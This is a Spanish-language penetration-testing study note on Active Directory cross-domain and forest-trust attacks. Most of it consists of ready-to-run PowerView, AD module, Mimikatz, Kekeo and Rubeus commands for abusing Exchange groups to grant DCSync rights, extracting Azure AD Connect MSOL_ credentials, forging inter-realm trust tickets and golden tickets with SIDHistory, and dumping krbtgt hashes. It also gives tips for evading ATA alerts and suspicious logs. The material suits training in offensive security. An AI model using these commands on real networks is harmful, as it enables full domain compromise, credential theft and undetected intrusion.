# Cross Trust Attacks

- Ahora tenemos privilegios de administrador de dominio de acceso en el dominio
- Analicemos los ataques a través de Domain Trusts y Forest trusts.

![images/Cross%20Trust%20Attacks/Untitled.png](images/Cross%20Trust%20Attacks/Untitled.png)

**Cross Domain Attacks – MS Exchange -Interesting Groups**

Enumeremos si tenemos grupos de intercambio en el dominio techcorp.local:

PowerView:

`Get-DomainGroup *exchange* -Domain `

AD Module:

`Get-ADGroup -Filter 'Name -like "*exchange*"' -Server `

**Cross Domain Attacks – MS Exchange -Organization Management**

Enumeremos la pertenencia al grupo de administración de la organización:

PowerView:

`Get-DomainGroupMember "Organization Management" -Domain `

AD Module:

`Get-ADGroupMember -Identity "Organization Management" -Server `

Si tenemos privilegios de 'administrador de intercambio', que es miembro de la Administración de la organización, podemos agregar un usuario al grupo 'Permisos de Windows de Exchange':

PowerView:

`$user = Get-DomainUser -Identity user
$group = Get-DomainGroup -Identity 'Exchange Windows Permissions' -Domain 
Add-DomainGroupMember -Identity $group -Members $user -Verbose`

AD Module:

`$user = Get-ADUser -Identity user
$group = Get-ADGroup -Identity 'Exchange Windows Permissions' -Server 
Add-ADGroupMember -Identity $group -Members $user -Verbose`

**Cross Domain Attacks – MS Exchange - Organization Management and Enterprise Windows Permissions**

Ahora, como user (nueva sesión y después de un tiempo), simplemente podemos agregar los permisos para ejecutar DCSync. Esto es válido para cualquier usuario que forme parte del grupo de permisos de Windows Enterprise:

PowerView_dev:

`Add-DomainObjectAcl -TargetIdentity 'DC=,DC=local' -PrincipalIdentity 'us\user' -Rights DCSync -Verbose`

Y ejecutamos DCSync:

`Invoke-Mimikatz -Command '"lsadump::dcsync /user:\krbtgt /domain:"'`

**Cross Domain Attacks – MS Exchange -Exchange Trusted Subsystem**

Enumeremos la pertenencia al subsistema de confianza de Exchangue:

PowerView:

`Get-DomainGroupMember "Exchange Trusted Subsystem" -Domain `

ActiveDirectory module:

`Get-ADGroupMember -Identity "Exchange Trusted Subsystem" -Server `

Si tenemos privilegios de 'usuario de intercambio', que es miembro del Subsistema de confianza de Exchange, podemos agregar cualquier usuario al grupo DNSAdmins:

PowerView_dev:

`$user = Get-DomainUser -Identity user
$group = Get-DomainGroup -Identity 'DNSAdmins' -Domain 
Add-DomainGroupMember -Identity $group -Members $user -Verbose`

ActiveDirectory module:

`$user = Get-ADUser -Identity user
$group = Get-ADGroup -Identity 'DNSAdmins' -Server 
Add-ADGroupMember -Identity $group -Members $user -Verbose`

`**Cross Domain Attacks - Attacking Azure AD Integration**`

- Azure AD es un método popular para extender la administración de identidades desde AD local a las ofertas de Azure de Microsoft.
- Muchas empresas utilizan sus identidades de AD locales para acceder a las aplicaciones de Azure.
- "Una única identidad de usuario para la autenticación y autorización de todos los recursos, independientemente de la ubicación ... es una identidad híbrida".
- Un AD local se puede integrar con Azure AD mediante Azure AD Connect con los siguientes métodos:

    -Sincronización de hash de contraseña (PHS)

    -Autenticación de paso a través (PTA)

    -federación

- ¡Azure AD Connect se instala localmente y tiene una cuenta de privilegios elevados tanto en AD como en Azure AD!

Cross Domain Attacks - Attacking Azure AD

- Apuntemos a PHS.
- Comparte usuarios y sus hashes de contraseña desde AD local a Azure AD.
- Se crea un nuevo usuario MSOL_ que tiene
Derechos de sincronización (DCSync) en el dominio

![images/Cross%20Trust%20Attacks/Untitled%201.png](images/Cross%20Trust%20Attacks/Untitled%201.png)

Cross Domain Attacks - Attacking Azure AD Integration - PHS

- Enumere la cuenta PHS y el servidor donde está instalado AD Connect

PowerView: 

`Get-DomainUser -Identity "MSOL_*" -Domain `

ActiveDirectory module:

`Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server  -Properties * | select SamAccountName,Description | fl`

- Ya tenemos acceso administrativo.
- Con privilegios administrativos, si ejecutamos adconnect.ps1, podemos extraer las credenciales de la cuenta MSOL_ utilizada por AD Connect en texto sin cifrar

    `.\adconnect.ps1`

- Con la contraseña, podemos ejecutar comandos como MSOL_

    `runas /user:user\MSOL_ /netonly cmd`

- Y luego puede ejecutar el ataque DCSync:

    `Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'`

    `Invoke-Mimikatz -Command '"lsadump::dcsync /user:\krbtgt /domain:"'`

- Tenga en cuenta que debido a que AD Connect sincroniza los hash cada dos minutos, en un entorno empresarial, la cuenta MSOL_ se excluirá de herramientas como ATA. ¡Esto nos permitirá ejecutar DCSync sin alertas!

**Cross Domain Attacks – Forest Root**

- Los dominios del mismo bosque tienen una confianza bidireccional implícita con otros dominios. Existe una clave de confianza entre los dominios principal y secundario.
- Se puede abusar de SIDHistory de dos formas para aumentar los privilegios dentro de un bosque:
    - hash krbtgt del secundario
    - Trust tickets
- Toda la escalada de privilegios a techcorp.local que hemos visto hasta ahora necesita una configuración incorrecta. Estos están "funcionando según lo previsto".

![images/Cross%20Trust%20Attacks/Untitled%202.png](images/Cross%20Trust%20Attacks/Untitled%202.png)

![images/Cross%20Trust%20Attacks/Untitled%203.png](images/Cross%20Trust%20Attacks/Untitled%203.png)

Cross Domain Attacks – Child to Forest Root -Trust Key

- Entonces, lo que se requiere para falsificar tickets de confianza es, obviamente, la clave de confianza.
Busque la clave de confianza [In] del niño al padre.

    `Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName us-dc`

- Forjemos una TGT inter-reino:

    `Invoke-Mimikatz -Command '"kerberos::golden 
    /domain: /sid: /sids:
    /rc4: /user:Administrator /service:krbtgt
    /target: /ticket:C:\trust_tkt.kirbi"'`

    ![images/Cross%20Trust%20Attacks/Untitled%204.png](images/Cross%20Trust%20Attacks/Untitled%204.png)

- Obtenga un TGS para un servicio (CIFS a continuación) en el dominio de destino utilizando el ticket de confianza falsificado con Kekeo ([https://github.com/gentilkiwi/kekeo/](https://github.com/gentilkiwi/kekeo/)):

    `tgs::ask /tgt:C:\trust_tkt.kirbi /service:CIFS/`

- También se pueden crear tickets para otros servicios (como HOST y RPCSS para WMI, HOST y HTTP para PowerShell Remoting y WinRM)
- Utilice el TGS para acceder al servicio de destino (es posible que deba utilizarlo dos veces).

    `misc::convert lsa TGS_Administrator@local_krbtgt~.LOCAL@.kirbi`

    `ls \\.local\c$`

- Usando Rubeus:

    `.\Rubeus.exe asktgs /ticket:C:\trust_tkt.kirbi /service:cifs/ /dc: /ptt`

    `ls \\.local\c$`

**Cross Domain Attacks – Child to Forest Root -krbtgt**

- Abusaremos del historial de SID una vez más

    `Invoke-Mimikatz -Command '"kerberos::golden 
    /user:Administrator /domain: /sid: /krbtgt: /sids: /ptt"'`

- En el comando anterior, la opción mimkatz "/ sids" establece de manera forzosa el historial de SID para el grupo de administración empresarial, que es el grupo de administración empresarial forestal.
- Ahora podemos acceder como administrador:

    `ls \\.local\C$`

    `Enter-PSSession .local`

- Evite registros sospechosos mediante el grupo de controladores de dominio

    `Invoke-Mimikatz -Command '"kerberos::golden /user:us-dc$ /domain: /sid: /groups:516 /krbtgt: /sids: /ptt"'`

    – Domain Controllers

    – Enterprise Domain Controllers

    `Invoke-Mimikatz -Command '"lsadump::dcsync /user:user\Administrator/domain:"'`
